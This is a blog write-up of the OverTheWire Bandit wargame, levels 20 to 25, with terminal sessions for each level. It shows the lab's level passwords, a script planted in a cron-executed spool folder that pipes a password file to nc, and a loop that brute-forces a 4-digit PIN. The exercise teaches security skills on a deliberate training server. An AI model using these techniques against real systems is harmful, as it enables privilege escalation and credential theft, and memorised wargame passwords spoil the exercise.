<!doctype html><html lang=en>
<head>
<title>
Write-up: OverTheWire - Bandit Level 20 → Level 25 | Justin Perdok
</title>
<meta name=title content="Write-up: OverTheWire - Bandit Level 20 → Level 25 | Justin Perdok">
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="chrome=1">
<meta name=HandheldFriendly content="True">
<meta name=MobileOptimized content="320">
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=referrer content="no-referrer-when-downgrade">
<base href=https://justin-p.me/>
<meta name=description content="IT Geek, Ethical Hacker, DevOps Nut, PowerShell Fanatic and lover of beers🍻">
<meta name=author content="Justin Perdok">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:site content="@JustinPerdok">
<meta name=twitter:creator content="@JustinPerdok">
<meta property="og:title" content="Write-up: OverTheWire - Bandit Level 20 → Level 25 | Justin Perdok">
<meta property="og:type" content="website">
<meta property="og:url" content="https://justin-p.me/">
<meta property="og:image" content="https://justin-p.me//images/osprey.png">
<meta property="og:description" content="IT Geek, Ethical Hacker, DevOps Nut, PowerShell Fanatic and lover of beers🍻">
<link rel=icon type=image/png sizes=16x16 href=favicon.ico>
<meta name=theme-color content="#FFF">
<link rel=canonical href=https://justin-p.me/blog/write-up-overthewire-bandit-level-20-level-24/>
<link rel=stylesheet href=https://justin-p.me/style.3d9ed0c8ed4a7de59d1a99f6c56fa9ab43daaa5b8951f2082b11faa9417532b8.css type=text/css>
<style>.lazyload{opacity:.0001}.logo .lazyload{min-width:10em}</style>
<script src=https://justin-p.me/js/vendor/lazysizes.min.js async></script>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css>
</head>
<body>
<nav class="row middle-xs center-xs">
<div class="col-xs-6 col-sm-1 logo">
<a href=https://justin-p.me/#><img data-src=https://justin-p.me/images/me.png class=lazyload lazyload=on alt="Justin Perdok"></a>
</div>
<div class="col-xs-3 col-sm-2">
<h3><a href=https://justin-p.me/#about>About</a></h3>
</div>
<div class="col-xs-3 col-sm-2">
<h3><a href=https://justin-p.me/#work>Work</a></h3>
</div>
<div class="col-xs-3 col-sm-2">
<h3><a href=https://justin-p.me/#blog>Blog</a></h3>
</div>
<div class="col-xs-6 col-sm-1 nav-toggle">
<a href class=nav-icon onclick=return!1>
<img data-src=https://justin-p.me/images/icon-menu.png class=lazyload lazyload=on alt="Open Menu">
<img data-src=https://justin-p.me/images/icon-x.png class=lazyload lazyload=on alt="Close Menu" style=display:none>
</a>
</div>
</nav>
<section class="nav-full row middle-xs center-xs">
<div class=col-xs-12>
<div class="row middle-xs center-xs">
<div class=col-xs-12><h1><a href=https://justin-p.me/#about>About</a></h1></div>
<div class=col-xs-12><h1><a href=https://justin-p.me/#work>Work</a></h1></div>
<div class=col-xs-12><h1><a href=https://justin-p.me/#blog>Blog</a></h1></div>
</div>
</div>
</section>
<main>
<section class=container>
<section class=content>
<h1> Write-up: OverTheWire - Bandit Level 20 → Level 25 </h1>
<div class=sub-header>
September 12, 2019 · 8 minutes read
</div>
<article class=entry-content>
<h3 id=bandit-level-20--level-21>Bandit Level 20 → Level 21</h3>
<p><strong>Level Goal:</strong>
<em>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21). NOTE: Try connecting to your own network daemon to see if it works as you think</em></p>
<p>To solve this we need to run 2 programs. The <code>suconnect</code> binary and some sort of program that can open a port and receive data, <code>nc</code> is perfect for this. But how do we run 2 programs at the same time ? There are multiple ways to go here with <code>bg</code> \ <code>fg</code>, <code>screens</code> or even a second <code>ssh</code> session, but I personally love <code>tmux</code> . If you want to learn <code>tmux</code> I recommend looking at this <a href=https://gist.github.com/MohamedAlaa/2961058>cheat sheet</a>.</p>
<p>To start we login and start <code>tmux</code> . I create an additional horizontal pane with <code>CTRL+B</code> followed by <code>SHIFT+"</code> .</p>
<pre tabindex=0><code>~/wargames/overthewire/bandit$ ssh bandit20@bandit.labs.overthewire.org -p 2220

bandit20@bandit~$ tmux
*CTRL+B SHIFT &quot;*
</code></pre><p>On the bottom pane I start <code>nc</code> as a listener with the <code>-l</code> flag on port <code>1337</code> with the <code>-p</code> flag. Then on top pane i run suconnect and tell it to connect to port <code>1337</code>. We then paste in the password on the <code>nc</code> listener and the <code>suconnect</code> library returns the next password.</p>
<pre tabindex=0><code>
bandit20@bandit:~$ ./suconnect 1337
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
bandit20@bandit:~$

──────────────────────────────────────────────────

bandit20@bandit:~$ nc -l -p 1337
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
bandit20@bandit:~$


^d
^d
[exited]
bandit20@bandit~$ logout
Connection to bandit.labs.overthewire.org closed.
</code></pre><h3 id=bandit-level-21--level-22>Bandit Level 21 → Level 22</h3>
<p><strong>Level Goal:</strong>
*A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
*</p>
<p>Ah our friendly neighbor <code>cron</code>. Lets start with <code>cat</code>&lsquo;ing all the jobs. Here we find one find 3 jobs. Lets test if we can <code>cat</code> the first one.</p>
<pre tabindex=0><code>~/wargames/overthewire/bandit$ ssh bandit21@bandit.labs.overthewire.org -p 2220

bandit21@bandit~$ cat /etc/cron.d/*
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&gt; /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&gt; /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&gt; /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&gt; /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&gt; /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&gt; /dev/null
</code></pre><p>So it seems the job creates a file in a random file in <code>/tmp</code>. It then uses <code>cat</code> on <code>/etc/bandit_pass/bandit22</code> and redirects the output to that random file. So lets <code>cat</code> that file for the password.</p>
<pre tabindex=0><code>bandit21@bandit~$ cat /usr/bin/cronjob_bandit22
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
bandit21@bandit~$ logout
Connection to bandit.labs.overthewire.org closed.
</code></pre><h3 id=bandit-level-22--level-23>Bandit Level 22 → Level 23</h3>
<p><strong>Level Goal:</strong>
*A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
<p>NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.
*</p>
<p>So again, lets start with <code>cat</code>. A educated guess would to be to check <code>/usr/bin/cronjob_bandit23.sh</code>.</p>
<pre tabindex=0><code>~/wargames/overthewire/bandit$ ssh bandit22@bandit.labs.overthewire.org -p 2220

bandit22@bandit~$ cat /etc/cron.d/*
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&gt; /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&gt; /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&gt; /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&gt; /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&gt; /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&gt; /dev/null
</code></pre><p>Here we find a bash script. So lets see what it does.</p>
<p>This bash scripts creates a variable named <code>myname</code> and <code>mytarget</code>.</p>
<p><code>myname</code> contains the output of <code>whoami</code> which returns the current username.</p>
<p><code>mytarget</code> contains the output on 3 piped commands, <code>echo</code> , <code>md5sum</code> and <code>cut</code>. <code>echo</code> returns the string <code>echo I am user bandit23</code> , <code>md5sum</code> then prints the <code>MD5 checksum</code> of that string and pipes it to <code>cut</code> which removes everything after the checksum.</p>
<p>After setting these variables it then proceeds to copy over the password file of bandit23 to a file stored in <code>/tmp/</code> with the <code>MD5 checksum</code> as it filename.</p>
<pre tabindex=0><code>bandit22@bandit~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;

cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget
</code></pre><p>So lets replicate this by hand.</p>
<pre tabindex=0><code>bandit22@bandit~$ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
bandit22@bandit~$ echo $mytarget
8ca319486bfbbc3663ea0fbe81326349
</code></pre><p>And then <code>cat</code> the password file.</p>
<pre tabindex=0><code>bandit22@bandit~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n&lt;font&gt;
bandit22@bandit~$ logout
Connection to bandit.labs.overthewire.org closed.
</code></pre><h3 id=bandit-level-23--level-24>Bandit Level 23 → Level 24</h3>
<p><strong>Level Goal:</strong>
*A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
<p>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>
<p>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
*</p>
<p>So I&rsquo;m not going to bother to check the current cronjobs and just <code>cat</code> the cronjob for bandit24. This contains another bash script. Lets see what it does.</p>
<p>It sets up a variable named <code>myname</code> that contains the name of the current user running it, i.e. bandit24. It then changes directory&rsquo;s to <code>/var/spool/bandit24</code> . It then proceeds to run every file in this folder and then deleting it. Great! We got ACE! So lets abuse this.</p>
<pre tabindex=0><code>~/wargames/overthewire/bandit$ ssh bandit23@bandit.labs.overthewire.org -p 2220

bandit23@bandit~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;
for i in * .*;
do
    if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ];
    then
        echo &quot;Handling $i&quot;
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
</code></pre><p>Lets first setup a folder in <code>/tmp</code> where we can work in. Create <code>give_pass.sh</code> , setup execution rights and open it in vim.</p>
<pre tabindex=0><code>bandit23@bandit~$ mkdir /tmp/giv_pass
bandit23@bandit~$ cd /tmp/giv_pass
bandit23@bandit/tmp/giv_pass$ touch give_pass.sh
bandit23@bandit/tmp/giv_pass$ chmod +x give_pass.sh
bandit23@bandit/tmp/giv_pass$ vim give_pass.sh
</code></pre><p>Lets keep this really simple and just <code>cat</code> the password file and redirect this to <code>nc</code> which will connect to localhost on port <code>1337</code>.</p>
<pre tabindex=0><code>#/bin/bash
cat /etc/bandit_pass/bandit24 | nc 127.0.0.1 1337
</code></pre><p>Now lets start <code>tmux</code> and create 2 panes.</p>
<pre tabindex=0><code>bandit23@bandit/tmp/giv_pass$ tmux
CTRL + B SHIFT &quot;
</code></pre><p>In the bottom pane I start a <code>nc</code> listener on port <code>1337</code>. I then copy over the <code>give_pass.sh</code> script to the ACE folder. After about 1 min we are greeted with the password of bandit24.</p>
<pre tabindex=0><code>bandit23@bandit/tmp/giv_pass$ cp give_pass.sh /var/spool/bandit24/give_pass.sh
bandit23@bandit/tmp/giv_pass$
────────────────────────────────────
bandit23@bandit/tmp/giv_pass$ nc -l -p 1337
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
^d
^d
[exited]
bandit23@bandit/tmp/giv_pass$ logout
Connection to bandit.labs.overthewire.org closed.
</code></pre><h3 id=bandit-level-24--level-25>Bandit Level 24 → Level 25</h3>
<p><strong>Level Goal:</strong>
*A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
*</p>
<p>Okay, so we need to create a pretty basic brute forcing tool. We need to loop over every possible 4-digit pincode ( <code>0000</code> and <code>9999</code> ). Lets setup a folder in /tmp, create brute_port.sh, setup execution rights and open it in vim.</p>
<pre tabindex=0><code>bandit23@bandit~$ ssh bandit24@bandit.labs.overthewire.org -p 2220

bandit24@bandit~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
bandit24@bandit~$ mkdir /tmp/brute_port
bandit24@bandit~$ cd /tmp/brute_port
bandit24@bandit/tmp/brute_port$ touch brute_port.sh
bandit24@bandit/tmp/brute_port$ chmod +x brute_port.sh
bandit24@bandit/tmp/brute_port$ vim brute_port.sh
</code></pre><p>Lets not make this harder then it should be and create a <code>for</code> loop. The <code>for</code> loop will iterate over each possible 4-digit pincode and store there current pincode in the variable <code>i</code>. Then we <code>echo</code> the password of bandit24 plus the current iteration of the pincode.</p>
<pre tabindex=0><code>#/bin/bash
for i in {0000..9999}
do
        echo &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&quot; $i
done
</code></pre><p>Now we start the script and pipe <code>|</code> the output to <code>nc</code> which will connect to <code>localhost:30002</code> . Running the script like this will return the <code>Wrong! Please enter the correct pincode. Try again.</code> string 9999 times, so lets hide that with <code>grep</code>.</p>
<pre tabindex=0><code>bandit24@bandit:/tmp/brute_port$ ./brute_port.sh | nc 127.0.0.1 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
</code></pre><p>Using the <code>-v</code> flag on <code>grep</code> we can do a <code>invert-match</code> . This means <code>grep</code> will only match to values that are not equal to the wrong pincode message. So lets rerun our script.</p>
<pre tabindex=0><code>bandit24@bandit:/tmp/brute_port$ ./brute_port.sh | nc 127.0.0.1 30002 | grep -v 'Wrong! Please enter the correct pincode. Try again.'
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
bandit24@bandit/tmp/brute_port$ logout
Connection to bandit.labs.overthewire.org closed.
</code></pre>
</article>
<div class=pagination>
<a href=https://justin-p.me/blog/write-up-overthewire-bandit-level-16-level-level-20/>&#171; Write-up: OverTheWire - Bandit Level 16 → Level 20</a>
<a href=https://justin-p.me/blog/write-up-overthewire-bandit-level-25-level-27/>Write-up: OverTheWire - Bandit Level 25 → Level 27 &#187;</a>
</div>
</section>
<br>
<section class=disqus>
<div id=disqus_thread></div>
<script type=text/javascript>(function(){var b,a;if(window.location.hostname=="localhost")return;b='',a=document.createElement('script'),a.type='text/javascript',a.async=!0,a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view comments powered by <a href=http://disqus.com/?ref_noscript>Disqus</a>.</noscript>
</section>
</section>
</main>
<footer class="row middle-xs center-xs">
<div class="col-xs-3 col-md-2"><a target=_blank rel=noopener href=https://github.com/justin-p>GitHub</a></div>
<div class="col-xs-3 col-md-2"><a target=_blank rel=noopener href=https://linkedin.com/in/justinperdok>LinkedIn</a></div>
<div class="col-xs-3 col-md-2"><a target=_blank rel=noopener href=https://twitter.com/JustinPerdok>Twitter</a></div>
</footer>
<script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js></script>
<script>hljs.initHighlightingOnLoad()</script>
<script src=https://justin-p.me/js/src/main.min.eae71e379c2461af7fb34269ff746c36d0aa5343dd34e47314df0f3808c2d2a1.js type=text/javascript></script>
</body>
</html>